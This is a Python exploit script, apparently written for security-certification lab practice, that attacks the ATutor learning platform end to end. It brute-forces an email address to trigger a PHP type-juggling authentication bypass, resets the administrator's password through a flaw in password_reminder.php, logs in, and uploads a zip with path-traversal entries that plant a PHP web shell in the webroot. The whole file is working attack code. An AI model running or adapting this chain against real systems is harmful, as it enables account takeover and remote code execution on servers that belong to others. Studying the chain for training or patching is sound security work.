#!/usr/bin/env python3
import datetime
import hashlib, string, itertools, re, requests, sys
import zipfile

# use sqli to extract these data first
def bypass_auth():
  date = "2016-03-22 10:02:26" # taken from the database
  id = "1"

  # +-----------+---------+---------------------------+---------------------+
  # | member_id | login   | email                     | creation_date       |
  # +-----------+---------+---------------------------+---------------------+
  # |         1 | teacher | aaaaai0m@sourceincite.com | 2016-03-22 10:02:26 |
  # |         2 | hacker  | hacker@pwned.com          | 0000-00-00 00:00:00 |
  # +-----------+---------+---------------------------+---------------------+

  # your controlled domain
  e = "notoffsec.com"
  count = 0
  chars = string.ascii_lowercase + string.digits
  valid_email = ""
  hash = ""
  for word in map("".join, itertools.product(chars, repeat=8)):
    s = f"{word}@{e}{date}{id}"
    hash = hashlib.md5(s.encode()).hexdigest()[:10]
    if re.match(r'0+[eE]+\d+$', hash):
      print(f"(+) found a valid email! {word}@{e}")
      print(f"(+) made a total of {count} requests")
      print(f"(+) php did: {hash} == 0")
      valid_email = f"{word}@{e}"

      break
    count += 1

  # first request to set the email address.
  data = {
    'e': valid_email,
    'id': '1',
    'm': '0'
  }
  resp = requests.get(f'{url}confirm.php', params=data, allow_redirects=False, proxies=proxies, headers=headers)  # follows no redirects

  # second request to bypass the auth using set email address.
  data = {
    'e': valid_email,
    'id': '1',
    'm': '1', # important, it cannot be 0
    'member_id': '1',
    'auto_login': '1',
    'code': '0'
  }

  resp = requests.get(f'{url}confirm.php', params=data, allow_redirects=False, proxies=proxies, headers=headers)  # follows no redirects
  respCookie = resp.headers['Set-Cookie']
  # since the requests is made without the first cookie, server will return 3 cookies, we take the last 
  matches = re.findall(r"ATutorID=(\w+)", respCookie)
  return matches[-1]


def find_user(cookie):
  cookies = {
    'ATutorID': cookie,
    'flash': 'no'
  }
  resp = requests.get(f"{url}users/profile.php", cookies=cookies, headers=headers, proxies=proxies)
  username = re.search(r'<span id="login">(.*)</span>', resp.text).group(1)
  return username


def disclose_web_root(sess):
  resp = sess.get(f"{url}jscripts/ATutor_js.php")
  return re.search(r'jscripts/ATutor_js.php', resp.text) != None


def upload_shell(sess):
  zipf = zipfile.ZipFile('cmd.zip', 'w', zipfile.ZIP_DEFLATED)
  zipf.write('cmd.php', '../../../../../../../../../../../../../var/www/html/ATutor/mods/cmd.pht')
  zipf.write('cmd.php', '../../../../../../../../../../../../../var/www/html/ATutor/mods/cmd.php4')
  zipf.write('cmd.php', '../../../../../../../../../../../../../var/www/html/ATutor/mods/cmd.phtml')
  zipf.close()

  files = {
    'file': ('cmd.zip', open('cmd.zip', 'rb'), 'application/zip'),
    'submit_import': (None, '')
  }

  params = { 'h': '' }

  # check the session
  resp = sess.post(f"{url}mods/_standard/tests/question_import.php", params=params, files=files, allow_redirects=False)
  uploaded = re.search('question.db', resp.headers['Location'])
  return uploaded


def login(username, password):
  sess = requests.Session()
  hash = hashlib.sha1(password.encode()).hexdigest()
  hash = hashlib.sha1(hash.encode()).hexdigest()
  sess.proxies.update(proxies)
  sess.headers.update(headers)
  data = {
      'form_password_hidden': hash,
      'form_login': username,
      'submit': 'Login',
      'token': ''
  }
  resp = sess.post(f"{url}login.php", data=data, allow_redirects=False)
  return sess


def reset_password():
  # this is due to line 79 of password_reminder.php
  days = (datetime.datetime.utcnow() - datetime.datetime(1970,1,1)).days
  # make a semi strong password, we have to encourage security now :->
  passwd = 'password123'
  hash = hashlib.sha1(passwd.encode()).hexdigest()
  data = {
    'form_change': 'true',
    # the default install script creates a member
    # so we know for sure, that it will be 1
    'id': '1',
    'g': days + 1,                    # needs to be > the number of days since epoch
    'h': '',                          # not even checked!
    'form_password_hidden': hash,     # remotely reset the password
    'submit': 'Submit'
  }

  resp = requests.post(f"{url}password_reminder.php", data=data, headers=headers, proxies=proxies, allow_redirects=False)
  return passwd

if __name__ == '__main__':

  target = 'atutor'
  url = f'http://{target}/ATutor/'
  
  proxies = {
   # "http": "http://127.0.0.1:8080",
  }

  headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0'
  }

  print('Bypassing authentication...')
  print('Triggering type juggle attack...')
  student_cookie = bypass_auth()
  print(f"Successfully bypassed the authentication in and got cookie {student_cookie}!")
  username = find_user(student_cookie)
  print(f"Found the username: {username} !")
  password = reset_password()
  print(f"Successfully reset the {username}'s account password to {password} !")
  sess = login(username, password)
  # print_good("Logged in as #{username}")

  if disclose_web_root(sess):
     print("Found the webroot")
     # we got everything. Now onto pwnage
     if upload_shell(sess):
        print("Zip upload successful !")

